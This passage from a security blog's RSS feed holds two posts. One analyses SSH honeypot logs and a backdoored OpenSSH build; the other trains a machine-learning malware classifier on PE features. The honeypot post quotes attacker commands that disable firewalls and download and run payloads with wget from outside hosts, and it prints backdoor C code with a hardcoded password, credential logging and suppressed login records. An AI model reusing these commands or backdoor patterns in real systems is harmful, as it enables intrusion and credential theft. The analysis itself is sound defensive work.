&lt;li&gt;postgres&lt;/li&gt;
&lt;li&gt;guest&lt;/li&gt;
&lt;li&gt;ubnt&lt;/li&gt;
&lt;li&gt;git&lt;/li&gt;
&lt;li&gt;nagios&lt;/li&gt;
&lt;li&gt;ftpuser&lt;/li&gt;
&lt;li&gt;ubuntu&lt;/li&gt;
&lt;li&gt;tomcat&lt;/li&gt;
&lt;li&gt;pi&lt;/li&gt;
&lt;li&gt;support&lt;/li&gt;
&lt;li&gt;(empty user)&lt;/li&gt;
&lt;li&gt;ftp&lt;/li&gt;
&lt;li&gt;teamspeak&lt;/li&gt;
&lt;li&gt;mysql&lt;/li&gt;
&lt;li&gt;bin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Top 20 passwords&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;123456&lt;/li&gt;
&lt;li&gt;password&lt;/li&gt;
&lt;li&gt;root123 (used regularly as accepted by cowrie)&lt;/li&gt;
&lt;li&gt;1234&lt;/li&gt;
&lt;li&gt;12345&lt;/li&gt;
&lt;li&gt;admin&lt;/li&gt;
&lt;li&gt;test&lt;/li&gt;
&lt;li&gt;root&lt;/li&gt;
&lt;li&gt;123&lt;/li&gt;
&lt;li&gt;(empty password)&lt;/li&gt;
&lt;li&gt;1&lt;/li&gt;
&lt;li&gt;p@ssw0rd&lt;/li&gt;
&lt;li&gt;!@&lt;/li&gt;
&lt;li&gt;wubao&lt;/li&gt;
&lt;li&gt;jiamima&lt;/li&gt;
&lt;li&gt;!q@w&lt;/li&gt;
&lt;li&gt;!&lt;/li&gt;
&lt;li&gt;!qaz@wsx&lt;/li&gt;
&lt;li&gt;qwerty&lt;/li&gt;
&lt;li&gt;user&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Successfull attacks often juste download a malicious script/binary and execute it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;what-are-those-files:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;What are those files?!?&lt;/h2&gt;

&lt;p&gt;Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2016-01-21 19:37:19+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] login attempt [root/root123] succeeded
2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] root authenticated with keyboard-interactive
2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] starting service ssh-connection
2016-01-21 19:37:20+0100 [SSHService ssh-connection on HoneyPotTransport,111016, 37.228.227.119] got channel session request
2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] channel open
2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] pty request: xterm (24, 80, 0, 0)
[SNIP]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The cowrie log is pretty long because&amp;hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&amp;rsquo;t implement all the shell commands), and in the end the interesting one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;unset HISTFILE
unset HISTSAVE
unset SAVEFILE
unset ********
history -n
unset WATCH
export HISTFILE=/dev/null
w
sshd
uname -a
ps x
cat /etc/hosts
/sbin/ifconfig -a |grep inet | wc -l
ls -la
wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
ls -la
cd ..
rm -rf ssh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the attacker doesn&amp;rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.&lt;/p&gt;

&lt;p&gt;Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor&#34;&gt;github&lt;/a&gt; if you want to check by yourself)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; cat v
OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is still one weird thing : what is this &lt;em&gt;backdoor.h&lt;/em&gt; file ?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/* backdoor stuff */
#define BACKDOORPASSWD &amp;quot;SSHD_PASS&amp;quot;
#define LOGGING_PASSWORDS 1
#define PASSWORDS_LOG_FILE &amp;quot;LOG_PATH&amp;quot;

int backdoor_active;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The BACKDOORPASSWD macro is used in the file &lt;em&gt;auth-passwd.c&lt;/em&gt;, in the auth_password function in charge of checking the users password:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    backdoor_active = 0;
    if(strcmp(password, BACKDOORPASSWD) == 0)
    {
        backdoor_active = 1;
        return 1;
    }
    else
    {
    [LEGITIMATE CODE]
    [...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Strangely, this backdoor also implements a logging functionnality both in &lt;em&gt;sshconnect1.c&lt;/em&gt; and &lt;em&gt;sshconnect2.c&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    if((strcmp(BACKDOORPASSWD,password) != 0) &amp;amp;&amp;amp; LOGGING_PASSWORDS)
      {
        FILE *fp = fopen(PASSWORDS_LOG_FILE,&amp;quot;a&amp;quot;);
        fprintf (fp,&amp;quot;+host: %s +user: %s +password: %s\n&amp;quot;, get_remote_ipaddr(), options.user, password);
        fclose (fp)
      }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In &lt;em&gt;session.c&lt;/em&gt;, the backdoor disable the hist file and force the suid to 0 (root):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;     if(backdoor_active)
        child_set_env(&amp;amp;env, &amp;amp;envsize, &amp;quot;HISTFILE&amp;quot;, &amp;quot;/dev/null&amp;quot;);

    [...]

    if(!backdoor_active)
      {
        [SNIP]
      }
    else
      {
        setgid(0);
        initgroups(pw-&amp;gt;pw_name, 0);
      }

    [...]
    if(!backdoor_active)
        permanently_set_uid(pw);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally in &lt;em&gt;sshlogin.c&lt;/em&gt;, it disable logging of connections using the backdoor password:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/*
* Records that the user has logged in.  I these parts of operating systems
* were more standardized.
*/
void
record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
    const char *host, struct sockaddr * addr, socklen_t addrlen)
{
  if(!backdoor_active)
      {
        struct logininfo *li;

        li = login_alloc_entry(pid, user, host, ttyname);
        login_set_addr(li, addr, addrlen);
        login_login(li);
        login_free_entry(li);
      }
    }
}
#ifdef LOGIN_NEEDS_UTMPX
void
record_utmp_only(pid_t pid, const char *ttyname, const char *user,
                 const char *host, struct sockaddr * addr, socklen_t addrlen)
{
  if(!backdoor_active)
    {
  struct logininfo *li;

  li = login_alloc_entry(pid, user, host, ttyname);
  login_set_addr(li, addr, addrlen);
  login_utmp_only(li);
  login_free_entry(li);
}}
#endif

/* Records that the user has logged out. */
void
record_logout(pid_t pid, const char *ttyname, const char *user)
{
  if(!backdoor_active)
    {
  struct logininfo *li;

  li = login_alloc_entry(pid, user, NULL, ttyname);
  login_logout(li);
  login_free_entry(li);
}
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All these modifications are in the &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch&#34;&gt;openssh-3.6.1p2-backdoor.patch&lt;/a&gt; included in the code.&lt;/p&gt;

&lt;h2 id=&#34;lets-do-threat-intelligence:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;Lets do Threat Intelligence&lt;/h2&gt;

&lt;p&gt;So let&amp;rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).&lt;/p&gt;

&lt;p&gt;This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).&lt;/p&gt;

&lt;p&gt;I have learnt recently that the &lt;a href=&#34;https://www.dshield.org/&#34;&gt;SANS Dshield Group&lt;/a&gt; collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called &lt;a href=&#34;https://github.com/jkakavas/kippo-pyshield&#34;&gt;kippo-pyshield&lt;/a&gt; to do this).&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s check what we can learn about the IP from the &lt;a href=&#34;https://dshield.org/api/&#34;&gt;Dshield API&lt;/a&gt;, you just have to visit &lt;a href=&#34;https://isc.sans.edu/api/ip/37.228.227.119&#34;&gt;https://isc.sans.edu/api/ip/37.228.227.119&lt;/a&gt; (?json or ?text can be added to change the format):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;ip&amp;gt;
    &amp;lt;number&amp;gt;37.228.227.119&amp;lt;/number&amp;gt;
    &amp;lt;count/&amp;gt;
    &amp;lt;attacks/&amp;gt;
    &amp;lt;maxdate/&amp;gt;
    &amp;lt;mindate/&amp;gt;
    &amp;lt;updated/&amp;gt;
    &amp;lt;comment/&amp;gt;
    &amp;lt;maxrisk/&amp;gt;
    &amp;lt;asabusecontact&amp;gt;noc@libertyglobal.com&amp;lt;/asabusecontact&amp;gt;
    &amp;lt;as&amp;gt;6830&amp;lt;/as&amp;gt;
    &amp;lt;asname&amp;gt;
	&amp;lt;![CDATA[
	    LGI-UPC formerly known as UPC Broadband Holding B.V.,
	]]&amp;gt;
    &amp;lt;/asname&amp;gt;
    &amp;lt;ascountry&amp;gt;AT&amp;lt;/ascountry&amp;gt;
    &amp;lt;assize&amp;gt;8576685&amp;lt;/assize&amp;gt;
    &amp;lt;network&amp;gt;37.228.224.0/19&amp;lt;/network&amp;gt;
&amp;lt;/ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).&lt;/p&gt;

&lt;p&gt;The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&amp;rsquo;t use any common framework (I contacted the owner, no answer yet).&lt;/p&gt;

&lt;h2 id=&#34;iocs:b73d1f2643f2d600a6335e280f6f3b4f&#34;&gt;IOCs&lt;/h2&gt;

&lt;p&gt;It&amp;rsquo;s not the new super-duper fancy APT group attack, but I like how &lt;a href=&#34;https://twitter.com/malware_traffic&#34;&gt;Brad&lt;/a&gt; ends &lt;a href=&#34;http://www.malware-traffic-analysis.net/&#34;&gt;his posts&lt;/a&gt; with a summary of what to check on your system, so here is a short summary:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bruteforce IP : 37.228.227.119&lt;/li&gt;
&lt;li&gt;URL of the malicious code : hxxp://fm.fo/images/cette.jpg (still available when writing the article, IP resolved is 77.243.43.9 in Denmark)&lt;/li&gt;
&lt;li&gt;SSH backdoor password : SSHD_PASS&lt;/li&gt;
&lt;li&gt;File created by the backdoor : LOG_PATH&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I&amp;rsquo;m still on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt; if you have any comment.&lt;/p&gt;

&lt;p&gt;Ciao&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Machine learning for malware detection</title>
      <link>https://www.randhome.io/blog/2016/07/16/machine-learning-for-malware-detection/</link>
      <pubDate>Sat, 16 Jul 2016 12:52:42 +0200</pubDate>
      
      <guid>https://www.randhome.io/blog/2016/07/16/machine-learning-for-malware-detection/</guid>
      <description>

&lt;p&gt;Plop,&lt;/p&gt;

&lt;p&gt;I have been reading many articles about Machine Learning recently, and it seems to be the new hype technology so I wanted to play a bit with these algorithms to better understand the principles behind it. If you don&amp;rsquo;t know machine learning, you should to read this &lt;a href=&#34;http://www.r2d3.us/visual-intro-to-machine-learning-part-1/&#34;&gt;awesome article&lt;/a&gt; or &lt;a href=&#34;https://redshiftzero.github.io/2015/08/29/Manipulation-and-Machine-Learning/&#34;&gt;this one&lt;/a&gt;. This article was largely inspired by &lt;a href=&#34;https://blog.socialcops.com/engineering/machine-learning-python&#34;&gt;this one which analyze the Titanic data&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;machine-learning-and-classification:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Machine Learning and Classification&lt;/h2&gt;

&lt;p&gt;So the idea of machine learning is to let the algorithm learn by itself the best parameters from data in order to make good predictions. There are many different applications, in our case we will consider using machine learning algorithm to classify binaries between legitimate and malicious binaries. This idea is &lt;a href=&#34;http://ieeexplore.ieee.org/xpl/login.jsp?tp=&amp;amp;arnumber=924286&amp;amp;url=http%3A%2F%2Fieeexplore.ieee.org%2Fxpls%2Fabs_all.jsp%3Farnumber%3D924286&#34;&gt;not&lt;/a&gt; &lt;a href=&#34;http://ieeexplore.ieee.org/xpl/login.jsp?tp=&amp;amp;arnumber=1297538&amp;amp;url=http%3A%2F%2Fieeexplore.ieee.org%2Fxpls%2Fabs_all.jsp%3Farnumber%3D1297538&#34;&gt;new&lt;/a&gt; and Adobe has even released a tool called &lt;a href=&#34;https://github.com/adobe-security/Malware-classifier&#34;&gt;Adobe Malware Classifier&lt;/a&gt; at &lt;a href=&#34;https://www.blackhat.com/html/webcast/webcast-2012-polymorphicmalware.html&#34;&gt;Black Hat 2012&lt;/a&gt; but it will be a nice exercice to see how to use machine learning.&lt;/p&gt;

&lt;p&gt;Here is the plan that we will follow :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Extract as many features as we can from binaries to have a good training data set. The features have to be integers or floats to be usable by the algorithms&lt;/li&gt;
&lt;li&gt;Identify the best features for the algorithm : we should select the information that best allows to differenciate legitimate files from malware.&lt;/li&gt;
&lt;li&gt;Choose a classification algorithm&lt;/li&gt;
&lt;li&gt;Test the efficiency of the algorithm and identify the False Positive/False negative rate&lt;/li&gt;
&lt;/ul&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.randhome.io/media/doctor5.jpg&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Let&amp;#39;s go!&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;h2 id=&#34;feature-extraction-from-binaries:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Feature Extraction from binaries&lt;/h2&gt;

&lt;p&gt;As I said earlier, machine learning only uses integer or float data as features for detection, but it is not a big deal as most &lt;a href=&#34;https://manalyzer.org/report/1e27184759cc4099c0da73b152408281&#34;&gt;PE parameters&lt;/a&gt; are integers (field size, addresses, parameters&amp;hellip;). So I extracted all the PE parameters I could by using pefile, and considered especially the one that are relevant for identifying malware, like the entropy of section for packer detection. As we can only have a fix list of feature (and not one per section), I extracted the Mean, Minimum and Maximum of entropy for sections and resources.&lt;/p&gt;

&lt;p&gt;Here is the final list of feature extracted : &lt;em&gt;Name, md5, Machine, SizeOfOptionalHeader, Characteristics, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase, SectionAlignment, FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, NumberOfRvaAndSizes, SectionsNb, SectionsMeanEntropy, SectionsMinEntropy, SectionsMaxEntropy, SectionsMeanRawsize, SectionsMinRawsize, SectionMaxRawsize, SectionsMeanVirtualsize, SectionsMinVirtualsize, SectionMaxVirtualsize, ImportsNbDLL, ImportsNb, ImportsNbOrdinal, ExportNb, ResourcesNb, ResourcesMeanEntropy, ResourcesMinEntropy, ResourcesMaxEntropy, ResourcesMeanSize, ResourcesMinSize, ResourcesMaxSize, LoadConfigurationSize, VersionInformationSize.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Many other feature could have been considered, for instance the number of suspicious function imported, or the number of section with a abnormal name, but it will be for another time (I ended the script a bit late in the night and forgot to implement those ¯\&lt;em&gt;(ツ)&lt;/em&gt;/¯ ).&lt;/p&gt;

&lt;p&gt;Regarding the dataset, we need to have an important number of both legitimate and malicious file:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;For legitimate file, I gathered all the Windows binaries (exe + dll) from Windows 2008, Windows XP and Windows 7 32 and 64 bits, so exactly 41323 binaries. It is not a perfect dataset as there is only Microsoft binaries and not binaries from application which could have different properties, but I did not find any easy way to gather easily a lot of legitimate binaries, so it will be enough for playing&lt;/li&gt;
&lt;li&gt;Regarding malware, I used a part of &lt;a href=&#34;https://virusshare.com/&#34;&gt;Virus Share&lt;/a&gt; collection by downloading one archive (the 134th) and kept only PE files (96724 different files).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I used &lt;a href=&#34;https://github.com/erocarrera/pefile&#34;&gt;pefile&lt;/a&gt; to extract all these features from the binaries and store them in a csv file (ugly code is &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/generatedata.py&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/data.csv&#34;&gt;data&lt;/a&gt; are here).&lt;/p&gt;

&lt;p&gt;And here we are with a large CSV file (138048 lines) ready for playing!&lt;/p&gt;

&lt;h2 id=&#34;feature-selection:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Feature Selection&lt;/h2&gt;

&lt;p&gt;The idea of feature selection is to reduce the 54 features extracted to a smaller set of feature which are the most relevant for differentiating legitimate binaries from malware.&lt;/p&gt;

&lt;p&gt;To play with the data, we will use &lt;a href=&#34;http://pandas.pydata.org/&#34;&gt;Pandas&lt;/a&gt; and then &lt;a href=&#34;http://scikit-learn.org/stable/index.html&#34;&gt;Scikit&lt;/a&gt; which largely uses the &lt;a href=&#34;http://www.numpy.org/&#34;&gt;numpy&lt;/a&gt; library:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;data = pd.read_csv(&#39;data.csv&#39;, sep=&#39;|&#39;)
legit_binaries = data[0:41323].drop([&#39;legitimate&#39;], axis=1)
malicious_binaries = data[41323::].drop([&#39;legitimate&#39;], axis=1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So a first way of doing it manually could be to check the different values and see if there is a difference between the two groups. For instance, we can take the parameter FileAlignment (which defines the alignment of sections and is by default 0x200 bytes) and check the values :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [8]: legit_binaries[&#39;FileAlignment&#39;].value_counts()
Out[8]:
512      36843
4096      4313
128         89
32          40
65536       36
16           2
Name: FileAlignment, dtype: int64

In [9]: malicious_binaries[&#39;FileAlignment&#39;].value_counts()
Out[9]:
512     94612
4096     2074
128        18
1024       15
64          2
32          1
16          1
2048        1
Name: FileAlignment, dtype: int64

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So if we remove the 20 malware having weird values here, there is not much difference on this value between the two groups, this parameter would not make a good feature for us.&lt;/p&gt;

&lt;p&gt;On the other side, some values are clearly interesting like the max entropy of the sections which can be represented with an histogram:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [12]: plt.hist([legit_binaries[&#39;SectionsMaxEntropy&#39;], malicious_binaries[&#39;SectionsMaxEntropy&#39;]], range=[0,8], normed=True, color=[&amp;quot;green&amp;quot;, &amp;quot;red&amp;quot;],label=[&amp;quot;legitimate&amp;quot;, &amp;quot;malicious&amp;quot;])
Out[12]:
([array([ 0.        ,  0.00120095,  0.00129333,  0.00914567,  0.08896238,
        0.04665213,  0.12609933,  0.55631513,  0.37580371,  0.04452738]),
  array([  9.04607814e-05,   0.00000000e+00,   1.29229688e-05,
           1.55075625e-04,   5.16918751e-04,   1.51198735e-03,
           6.04794938e-03,   8.64675840e-02,   3.81266348e-01,
                                            7.73930754e-01])],
  array([ 0. ,  0.8,  1.6,  2.4,  3.2,  4. ,  4.8,  5.6,  6.4,  7.2,  8. ]),
  &amp;lt;a list of 2 Lists of Patches objects&amp;gt;)

In [13]: plt.legend()
Out[13]: &amp;lt;matplotlib.legend.Legend at 0x7f15da65ee10&amp;gt;

In [14]: plt.show()
&lt;/code&gt;&lt;/pre&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.randhome.io/media/sectionsmaxentropy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;But there is a more efficient way of selecting features : some algorithms have been developed to identify the most interesting features and reduce the dimensionality of the data set (see &lt;a href=&#34;http://scikit-learn.org/stable/modules/feature_selection.html&#34;&gt;the Scikit page for Feature Selection&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;In our case, we will use the &lt;a href=&#34;http://scikit-learn.org/stable/modules/feature_selection.html#tree-based-feature-selection&#34;&gt;Tree-based feature selection&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [15]: X = data.drop([&#39;Name&#39;, &#39;md5&#39;, &#39;legitimate&#39;], axis=1).values

In [16]: y = data[&#39;legitimate&#39;].values

In [17]: fsel = ske.ExtraTreesClassifier().fit(X, y)

In [20]: model = SelectFromModel(fsel, prefit=True)

In [21]: X_new = model.transform(X)

In [22]: X.shape
Out[22]: (110258, 54)

In [23]: X_new.shape
Out[23]: (110258, 11)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So in this case, the algorithm selected 11 important features among the 54, and we can notice that indeed the SectionsMaxEntropy is selected but other features (like the Machine value) are surprisingly also good parameters for this classification :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [1]: nb_features = X_new.shape[1]

In [2]: indices = np.argsort(fsel.feature_importances_)[::-1][:nb_features]

In [3]: for f in range(nb_features):
   ...:         print(&amp;quot;%d. feature %s (%f)&amp;quot; % (f + 1, data.columns[2+indices[f]], fsel.feature_importances_[indices[f]]))
      ...:
      1. feature Characteristics (0.187685)
      2. feature Machine (0.173019)
      3. feature ImageBase (0.099215)
      4. feature Subsystem (0.091090)
      5. feature MajorSubsystemVersion (0.077067)
      6. feature SectionsMaxEntropy (0.046552)
      7. feature SizeOfOptionalHeader (0.040004)
      8. feature ResourcesMaxEntropy (0.035633)
      9. feature VersionInformationSize (0.027091)
      10. feature SectionsNb (0.020562)
      11. feature DllCharacteristics (0.018640)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;selection-of-the-classification-algorithm:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Selection of the Classification Algorithm&lt;/h2&gt;

&lt;p&gt;The best classification algorithm depends on many parameters and some of them (like SVM) have a lot of different parameters and can be difficult to correctly configure. So I used a simple option: I tested some of them with default parameters and selected the best one (I removed SVM because it does not handle well dataset with many features):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;algorithms = {
        &amp;quot;DecisionTree&amp;quot;: tree.DecisionTreeClassifier(max_depth=10),
        &amp;quot;RandomForest&amp;quot;: ske.RandomForestClassifier(n_estimators=50),
        &amp;quot;GradientBoosting&amp;quot;: ske.GradientBoostingClassifier(n_estimators=50),
        &amp;quot;AdaBoost&amp;quot;: ske.AdaBoostClassifier(n_estimators=100),
        &amp;quot;GNB&amp;quot;: GaussianNB()
    }

results = {}
print(&amp;quot;\nNow testing algorithms&amp;quot;)
for algo in algorithms:
    clf = algorithms[algo]
    clf.fit(X_train, y_train)
    score = clf.score(X_test, y_test)
    print(&amp;quot;%s : %f %%&amp;quot; % (algo, score*100))
    results[algo] = score

winner = max(results, key=results.get)
print(&#39;\nWinner algorithm is %s with a %f %% success&#39; % (winner, results[winner]*100))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s run it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Now testing algorithms
GNB : 69.478450 %
DecisionTree : 98.960522 %
RandomForest : 99.351684 %
AdaBoost : 98.558493 %
GradientBoosting : 98.761318 %

Winner algorithm is RandomForest with a 99.351684 % success
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we recompute the false positive/false negative rate on the test data, we obtain :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;False positive : 0.568241 %&lt;/li&gt;
&lt;li&gt;False negative : 0.830565 %&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So it&amp;rsquo;s a 99.35% success, so more than the &lt;a href=&#34;https://www.blackhat.com/docs/webcast/TowardsClassificationofPolymorphicMalware-Final.pdf&#34;&gt;Adobe&lt;/a&gt; work (98.21%) but still with the RandomForest algorithm.&lt;/p&gt;

&lt;p&gt;The whole code for feature selection and algorithm test is available &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/learning.py&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;reuse-the-algorithm:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Reuse the algorithm&lt;/h2&gt;

&lt;p&gt;So now we want to reuse this algorithms for detection, we can just save the object and the feature list :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;joblib.dump(algorithms[winner], &#39;classifier/classifier.pkl&#39;)
open(&#39;classifier/features.pkl&#39;, &#39;w&#39;).write(pickle.dumps(features))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have then implemented a &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/checkpe.py&#34;&gt;simple tool&lt;/a&gt; which load the feature list and the classifier, extract the PE feature and predict if a binary is malicious or not:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt; python2 checkpe.py ~/virusshare/VirusShare_000b296200f7b8fffbc584f3eac864b2
The file VirusShare_000b296200f7b8fffbc584f3eac864b2 is malicious
&amp;gt; python2 checkpe.py ~/legitimate/explorer.exe
The file explorer.exe is legitimate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As I like the new &lt;a href=&#34;https://manalyzer.org/&#34;&gt;Manalyzer&lt;/a&gt; platform, I have also developed &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/checkmanalyzer.py&#34;&gt;a script&lt;/a&gt; which download the PE properties and predict if the binary is legitimate of not:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;python2 checkmanalyzer.py https://manalyzer.org/report/a9ea61c5ae7eab02c63955336a7c7efe
The file a9ea61c5ae7eab02c63955336a7c7efe is legitimate
&amp;gt; python2 checkmanalyzer.py https://manalyzer.org/report/9c5c27494c28ed0b14853b346b113145
The file 9c5c27494c28ed0b14853b346b113145 is malicious
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;why-it-s-not-enough:97ad8feb5a1df3c1e8f583b33ab354cb&#34;&gt;Why it&amp;rsquo;s not enough?&lt;/h2&gt;

&lt;p&gt;First, a bit of vocabulary for measuring IDS accuracy (taken from &lt;a href=&#34;https://en.wikipedia.org/wiki/Sensitivity_and_specificity&#34;&gt;Wikipedia&lt;/a&gt;):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Sensitivity&lt;/strong&gt; : the proportion of positives identified as such (or true positive rate)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Specificity&lt;/strong&gt; : the proportion of negatives correctly identified as such (or true negative)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;False Positive Rate&lt;/strong&gt; (FPR) : the proportion of events badly identified as positive over the total number of negatives&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;False Negative Rate&lt;/strong&gt; (FNR) : the proportion of events badly identified as negative over the total number of positives&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So why 99.35% is not enough?&lt;/p&gt;

&lt;p&gt;Because you can&amp;rsquo;t just consider the sensitivity/specificity of the algorithm, you have to consider the malicious over legitimate traffic ratio to understand how many alerts will be generated by the IDS. And this ratio is extremely low.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s consider the you have 1 malicious event every 10 000 event (it&amp;rsquo;s a really high ratio) and 1 000 000 events per day, you will have :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;100 malicious events, 99 identified by the tool and 1 false negative (0.83% FNR but let&amp;rsquo;s consider 1% here)&lt;/li&gt;
&lt;li&gt;999 900 legitimate events, around 6499 identified as malicious (0.65% FPR)&lt;/li&gt;
&lt;/ul&gt;

